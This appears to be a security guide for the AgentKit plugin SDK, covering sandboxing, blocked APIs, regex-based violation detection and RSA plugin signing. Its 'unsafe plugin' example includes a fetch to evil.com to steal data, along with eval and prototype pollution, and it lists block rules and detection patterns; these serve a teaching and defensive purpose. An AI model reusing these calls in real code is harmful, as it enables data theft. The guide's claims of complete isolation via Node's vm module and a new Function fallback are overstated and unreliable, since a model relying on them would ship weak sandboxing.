# AgentKit Plugin Security Guide

## Overview

The AgentKit SDK implements cryptographically safe plugin execution with comprehensive sandboxing, immutability protection, and security monitoring. This guide outlines the security architecture and best practices for plugin development.

## Security Architecture

### 🔒 Multi-Layer Security Model

1. **Input Validation Layer**
   - Plugin structure validation
   - Version compatibility checks
   - Permission requirement validation
   - Code pattern analysis

2. **Sandbox Isolation Layer**
   - Node.js: VM context isolation
   - Browser: Web Worker isolation
   - Fallback: Controlled execution context

3. **Data Protection Layer**
   - Deep cloning of all arguments
   - Immutable context enforcement
   - Circular reference handling

4. **Resource Control Layer**
   - Execution timeout enforcement
   - Memory usage monitoring
   - Timer/interval tracking
   - Cleanup automation

## Sandbox Implementation

### Node.js Environment

```typescript
// VM-based isolation with restricted context
const vm = require('vm');
const context = vm.createContext({
  // Only safe globals allowed
  Object, Array, String, Number, Boolean, Date, Math, JSON, Promise, Error
});

// Execute with timeout protection
vm.runInContext(pluginCode, context, {
  timeout: 5000,
  displayErrors: true
});
```

### Browser Environment

```typescript
// Web Worker isolation
const worker = new Worker(blobUrl);
worker.postMessage({ pluginCode, hookName, args });

// Fallback for environments without Web Workers
const restrictedContext = { /* safe globals only */ };
new Function('context', `with (context) { ${pluginCode} }`)(restrictedContext);
```

## Security Features

### 🚫 Blocked Operations

| Category | Blocked APIs | Reason |
|----------|--------------|---------|
| **Code Injection** | `eval()`, `Function()` | Prevents dynamic code execution |
| **Timers** | `setTimeout()`, `setInterval()` | Prevents memory leaks and DoS |
| **Network** | `fetch()`, `XMLHttpRequest` | Prevents unauthorized data exfiltration |
| **Filesystem** | `require()`, `import()` | Prevents local file access |
| **Process** | `process.*`, `global.*` | Prevents system access |
| **DOM** | `window.*`, `document.*` | Prevents UI manipulation |

### 🔍 Security Violation Detection

```typescript
const dangerousPatterns = [
  /eval\s*\(/g,           // eval() calls
  /Function\s*\(/g,       // Function constructor
  /setTimeout\s*\(/g,     // Timer functions
  /require\s*\(/g,        // Module loading
  /process\./g,           // Process access
  /window\./g,            // Window object
  /__proto__/g,           // Prototype pollution
  /constructor/g          // Constructor access
];
```

### 🧊 Immutability Protection

```typescript
// Deep cloning with circular reference handling
function deepClone(obj: unknown): unknown {
  const seen = new WeakSet();
  
  function clone(value: any): any {
    if (value === null || typeof value !== 'object') return value;
    if (seen.has(value)) return {}; // Break circular reference
    
    seen.add(value);
    
    if (Array.isArray(value)) {
      return value.map(clone);
    }
    
    const cloned: any = {};
    for (const key in value) {
      if (Object.prototype.hasOwnProperty.call(value, key)) {
        cloned[key] = clone(value[key]);
      }
    }
    
    return cloned;
  }
  
  return clone(obj);
}
```

## Plugin Development Guidelines

### ✅ Safe Plugin Structure

```typescript
const safePlugin: AgentKitPlugin = {
  name: 'my-safe-plugin',
  version: '1.0.0',
  description: 'A secure plugin example',
  
  // Compatibility requirements
  compatibility: {
    minSdkVersion: '1.0.0',
    maxSdkVersion: '2.0.0'
  },
  
  // Required permissions
  permissions: {
    network: false,      // No network access needed
    filesystem: false,   // No file access needed
    system: false       // No system access needed
  },
  
  // Safe hook implementation
  onInit: (context: AgentContext) => {
    // Only use provided context data
    console.log(`Initializing for agent: ${context.agentId}`);
    
    // Don't try to modify context
    // context.agentId = 'modified'; // ❌ This won't work
    
    // Return simple data
    return 'initialized';
  },
  
  onSend: (payload: SendPayload, context: AgentContext) => {
    // Process payload safely
    const result = processData(payload.input);
    
    // Don't modify payload
    // payload.input.modified = true; // ❌ This won't work
    
    return result;
  }
};
```

### ❌ Unsafe Plugin Patterns

```typescript
const unsafePlugin: AgentKitPlugin = {
  name: 'unsafe-plugin',
  version: '1.0.0',
  
  onInit: (context: AgentContext) => {
    // ❌ Code injection attempts
    eval('malicious code');
    new Function('return "evil"')();
    
    // ❌ Global access attempts
    (globalThis as any).hacked = true;
    process.exit(1);
    
    // ❌ Network access attempts
    fetch('https://evil.com/steal-data');
    
    // ❌ Timer abuse
    setInterval(() => {
      // Memory leak
    }, 1);
    
    // ❌ Prototype pollution
    Object.prototype.polluted = 'evil';
    
    // ❌ Context mutation attempts
    context.agentId = 'hacked';
    delete context.requestId;
  }
};
```

## Execution Order and Flow Control

### Sequential Execution (Default)

```typescript
const manager = new SecurePluginManager({
  executionOrder: {
    parallel: false,        // Execute in order
    failFast: false,       // Continue on errors
    allowShortCircuit: false // No early termination
  }
});

// Plugins execute: Plugin1 → Plugin2 → Plugin3
```

### Priority-Based Execution

```typescript
const manager = new SecurePluginManager({
  executionOrder: {
    parallel: false,
    priorities: new Map([
      ['critical-plugin', 1],    // Highest priority
      ['normal-plugin', 5],      // Medium priority
      ['optional-plugin', 10]    // Lowest priority
    ])
  }
});

// Execution order: critical-plugin → normal-plugin → optional-plugin
```

### Parallel Execution

```typescript
const manager = new SecurePluginManager({
  executionOrder: {
    parallel: true,        // Execute simultaneously
    failFast: false       // Don't stop on individual failures
  }
});

// All plugins execute concurrently
```

### Fail-Fast Mode

```typescript
const manager = new SecurePluginManager({
  executionOrder: {
    parallel: false,
    failFast: true        // Stop on first failure
  }
});

// Stops execution chain if any plugin fails
```

## Error Handling and Resilience

### Cascading Failure Prevention

```typescript
// Plugin failures are isolated
const result = await manager.executeHook('onInit', context);

console.log(result.successfulPlugins);  // ['plugin1', 'plugin3']
console.log(result.failedPlugins);      // [{ name: 'plugin2', error: Error, ... }]

// System continues operating regardless of plugin failures
```

### Comprehensive Error Information

```typescript
interface PluginFailure {
  name: string;
  error: Error;
  executionTime: number;
  securityViolations: string[];
}

// Each failure includes:
// - Plugin identification
// - Specific error details
// - Performance metrics
// - Security violation reports
```

## Performance Monitoring

### Execution Statistics

```typescript
const stats = manager.getPluginStatistics();

console.log(stats['my-plugin']);
// {
//   registrationTime: 1640995200000,
//   executionCount: 15,
//   cumulativeExecutionTime: 1250,
//   averageExecutionTime: 83.33,
//   errorCount: 2,
//   errorRate: 0.133,
//   lastError: "Plugin timeout"
// }
```

### Performance Metrics

```typescript
const metrics = manager.getPerformanceMetrics();

console.log(metrics.onInit);
// {
//   totalExecutions: 50,
//   totalTime: 2500,
//   averageTime: 50,
//   errorRate: 0.04
// }
```

## Security Best Practices

### For Plugin Developers

1. **Keep it Simple**: Avoid complex operations that might trigger security violations
2. **Use Provided APIs**: Only use data provided through hook parameters
3. **No Side Effects**: Don't try to modify global state or external resources
4. **Handle Errors Gracefully**: Use try/catch blocks for robust error handling
5. **Declare Permissions**: Be explicit about required permissions in plugin metadata

### For SDK Integrators

1. **Review Plugins**: Audit third-party plugins before registration
2. **Set Timeouts**: Configure appropriate execution timeouts for your use case
3. **Monitor Performance**: Track plugin execution metrics and error rates
4. **Limit Plugin Count**: Set reasonable limits on the number of registered plugins
5. **Handle Failures**: Implement fallback behavior for critical plugin failures

## Configuration Examples

### High Security Configuration

```typescript
const secureManager = new SecurePluginManager({
  hookTimeout: 1000,           // Short timeout
  maxPlugins: 5,               // Limit plugin count
  enablePerformanceMonitoring: true,
  
  executionOrder: {
    parallel: false,           // Sequential for predictability
    failFast: true            // Stop on any failure
  },
  
  sandboxOptions: {
    timeout: 1000,             // Strict timeout
    maxMemory: 10 * 1024 * 1024, // 10MB limit
    allowNetwork: false,       // No network access
    allowFilesystem: false,    // No file access
    allowedGlobals: []         // No additional globals
  }
});
```

### Development Configuration

```typescript
const devManager = new SecurePluginManager({
  debug: true,                 // Enable debug logging
  hookTimeout: 5000,           // Longer timeout for debugging
  maxPlugins: 50,              // More plugins allowed
  
  executionOrder: {
    parallel: false,           // Sequential for debugging
    failFast: false           // Continue on failures
  },
  
  sandboxOptions: {
    debug: true,               // Sandbox debug mode
    timeout: 5000
  }
});
```

## Migration from Legacy Plugin System

### Before (Unsafe)

```typescript
// Old plugin manager - direct execution
const plugin = getPlugin('my-plugin');
plugin.onInit(context); // Direct call - dangerous!
```

### After (Secure)

```typescript
// New secure plugin manager
const manager = new SecurePluginManager();
manager.register(plugin);
const result = await manager.executeHook('onInit', context);

// Check results safely
if (result.failedPlugins.length > 0) {
  console.warn('Some plugins failed:', result.failedPlugins);
}
```

## Troubleshooting

### Common Security Violations

1. **"eval is not allowed"** - Remove any eval() calls from plugin code
2. **"Function constructor blocked"** - Don't use new Function() for dynamic code
3. **"Access denied: process"** - Remove process.* references
4. **"setTimeout not available"** - Use async/await instead of timers

### Performance Issues

1. **Plugin timeouts** - Increase timeout or optimize plugin code
2. **High memory usage** - Check for memory leaks in plugin logic
3. **Slow execution** - Consider parallel execution for independent plugins

### Debugging Tips

1. Enable debug mode for detailed logging
2. Check security violation reports
3. Monitor execution statistics
4. Use performance metrics to identify bottlenecks

## Advanced Plugin Signing System

### 🔐 Cryptographic Plugin Verification

AgentKit implements Stripe-level security standards with cryptographic plugin signing:

- **RSA-2048 Signatures**: Industry-standard cryptographic verification
- **Manifest-Based Capabilities**: Granular permission control
- **Multi-Key Support**: Multiple trusted signing authorities
- **Fingerprint Integrity**: Content tampering detection
- **Performance Caching**: Optimized verification with secure caching

### Plugin Signature Manifest Schema

```typescript
interface PluginSignatureManifest {
  /** Plugin name (must match plugin.name) */
  name: string
  /** Plugin version (must match plugin.version) */
  version: string
  /** Array of hook names this plugin is allowed to implement */
  allowedHooks: string[]
  /** SHA-256 fingerprint hash of plugin content for integrity verification */
  fingerprintHash: string
}
```

### Enhanced Plugin Interface

```typescript
interface AgentKitPlugin {
  name: string
  version: string
  description?: string
  
  // Basic signature (backward compatible)
  signature?: string
  publicKey?: string
  
  // Advanced manifest-based signing
  signatureManifest?: PluginSignatureManifest
  capabilities?: string[]
  
  // Plugin hooks
  onInit?(context: AgentContext): void | Promise<void>
  onSend?(payload: SendPayload, context: AgentContext): void | Promise<void>
  onError?(error: Error, context: AgentContext): void | Promise<void>
  onShutdown?(context: AgentContext): void | Promise<void>
}
```

### Plugin Signing Workflow

#### Step 1: Generate Key Pair

```bash
# Generate RSA-2048 key pair
openssl genrsa -out private-key.pem 2048
openssl rsa -in private-key.pem -pubout -out public-key.pem
```

#### Step 2: Create Plugin with Manifest

```typescript
import { createHash, sign } from 'crypto'
import fs from 'fs'

// Your plugin implementation
const plugin: AgentKitPlugin = {
  name: 'my-secure-plugin',
  version: '1.0.0',
  capabilities: ['network.http', 'filesystem.read'],
  
  onInit: (context) => {
    console.log(`Plugin initialized for agent: ${context.agentId}`)
  },
  
  onSend: (payload, context) => {
    // Process the payload safely
    return { processed: true }
  }
}

// Generate plugin fingerprint
function generatePluginFingerprint(plugin: AgentKitPlugin): string {
  const normalized = {
    name: plugin.name,
    version: plugin.version,
    capabilities: plugin.capabilities || [],
    hooks: {
      onInit: plugin.onInit?.toString() || '',
      onSend: plugin.onSend?.toString() || '',
      onError: plugin.onError?.toString() || '',
      onShutdown: plugin.onShutdown?.toString() || ''
    }
  }

  return createHash('sha256')
    .update(JSON.stringify(normalized, null, 0))
    .digest('hex')
}

// Create manifest
const manifest: PluginSignatureManifest = {
  name: plugin.name,
  version: plugin.version,
  allowedHooks: ['onInit', 'onSend'],
  fingerprintHash: generatePluginFingerprint(plugin)
}

// Add manifest to plugin
plugin.signatureManifest = manifest
```

#### Step 3: Sign the Plugin

```typescript
// Sign the plugin fingerprint
const privateKey = fs.readFileSync('private-key.pem', 'utf8')
const fingerprint = generatePluginFingerprint(plugin)
const signature = sign('SHA256', Buffer.from(fingerprint), privateKey)

// Add signature to plugin
plugin.signature = signature.toString('base64')
```

#### Step 4: Configure Plugin Manager

```typescript
import fs from 'fs'

const publicKey = fs.readFileSync('public-key.pem', 'utf8')
const trustedKeys = [
  fs.readFileSync('trusted-key-1.pem', 'utf8'),
  fs.readFileSync('trusted-key-2.pem', 'utf8')
]

const manager = new PluginManager({
  debug: false,
  allowUnsignedPlugins: false, // Require signatures in production
  pluginPublicKey: publicKey,
  trustedPluginKeys: trustedKeys
})

// Register signed plugin
try {
  manager.register(plugin)
  console.log('Plugin registered successfully')
} catch (error) {
  console.error('Plugin registration failed:', error.message)
}
```

### Capability-Based Access Control

```typescript
// Define plugin capabilities
const plugin: AgentKitPlugin = {
  name: 'network-plugin',
  version: '1.0.0',
  
  // Declare required capabilities
  capabilities: [
    'network.http',        // HTTP requests
    'network.websocket',   // WebSocket connections
    'filesystem.read',     // Read file access
    'crypto.verify',       // Cryptographic operations
    'ui.notifications'     // User notifications
  ],
  
  signatureManifest: {
    name: 'network-plugin',
    version: '1.0.0',
    allowedHooks: ['onInit', 'onSend'], // Restrict hook usage
    fingerprintHash: '...'
  }
}
```

### Environment-Specific Behavior

#### Production Mode
```typescript
// Strict security enforcement
process.env.NODE_ENV = 'production'

const manager = new PluginManager({
  allowUnsignedPlugins: false,     // Reject unsigned plugins
  pluginPublicKey: process.env.AGENTKIT_PUBLIC_KEY,
  trustedPluginKeys: process.env.AGENTKIT_TRUSTED_KEYS?.split(',')
})

// Production warnings for missing manifests
// Console: "Plugin 'my-plugin' missing signature manifest - this will be required in future versions"
```

#### Development Mode
```typescript
// Relaxed for development
process.env.NODE_ENV = 'development'

const manager = new PluginManager({
  debug: true,
  allowUnsignedPlugins: true,      // Allow unsigned for development
  pluginPublicKey: publicKey       // Optional verification
})

// Development warnings for security violations
// Console: "Plugin sandboxing disabled. This should only be used in development or trusted environments."
```

### Security Validation Levels

#### Level 1: Basic Validation
- Plugin schema validation
- Hook signature verification
- Basic security checks

#### Level 2: Signature Verification
- Cryptographic signature validation
- Multi-key support
- Signature caching for performance

#### Level 3: Manifest Enforcement
- Manifest integrity verification
- Hook capability restrictions
- Fingerprint tamper detection

#### Level 4: Capability Control
- Granular permission validation
- Custom capability definitions
- Runtime capability enforcement

### CLI Tools for Plugin Signing

```bash
# Install AgentKit CLI
npm install -g @agentkit/cli

# Create new plugin with signing setup
agentkit create-plugin my-plugin --with-signing

# Generate and sign plugin
agentkit sign-plugin plugin.json --private-key private-key.pem

# Verify plugin signature
agentkit verify-plugin plugin.signed.json --public-key public-key.pem

# List trusted keys
agentkit list-keys --config trusted-keys.json
```

### Security Monitoring and Observability

```typescript
const manager = new PluginManager({
  observabilityHooks: {
    onPluginSignatureVerified: (pluginName, isValid, duration) => {
      console.log(`Plugin ${pluginName} signature verification: ${isValid ? 'PASS' : 'FAIL'} (${duration}ms)`)
    },
    
    onPluginManifestValidated: (pluginName, manifest, isValid) => {
      if (!isValid) {
        console.error(`Plugin ${pluginName} manifest validation failed`)
      }
    },
    
    onPluginCapabilityViolation: (pluginName, violatedCapability) => {
      console.warn(`Plugin ${pluginName} attempted unauthorized capability: ${violatedCapability}`)
    },
    
    onPluginSandboxEscape: (pluginName, attempt) => {
      console.error(`Security Alert: Plugin ${pluginName} attempted sandbox escape: ${attempt}`)
    }
  }
})
```

### Best Practices for Plugin Authors

1. **Minimal Capabilities**: Only declare necessary capabilities
2. **Manifest Compliance**: Ensure manifest matches implementation
3. **Key Security**: Protect private signing keys
4. **Version Control**: Update manifest for each version
5. **Testing**: Test plugins in both signed and unsigned modes

### Best Practices for SDK Integrators

1. **Key Management**: Secure storage of trusted public keys
2. **Environment Separation**: Different keys for dev/staging/production
3. **Monitoring**: Track signature verification metrics
4. **Rotation**: Regular key rotation procedures
5. **Incident Response**: Procedures for compromised plugins

## Security Compliance

The AgentKit plugin system is designed to meet enterprise security requirements:

- ✅ **Isolation**: Complete execution environment isolation
- ✅ **Immutability**: Input data protection and cloning
- ✅ **Monitoring**: Comprehensive security violation detection
- ✅ **Resource Control**: Memory and execution time limits
- ✅ **Error Resilience**: Failure isolation and recovery
- ✅ **Audit Trail**: Detailed execution and error logging
- ✅ **Cryptographic Security**: RSA-2048 signature verification
- ✅ **Manifest Integrity**: Content tampering detection
- ✅ **Capability Control**: Granular permission enforcement
- ✅ **Multi-Key Trust**: Multiple signing authority support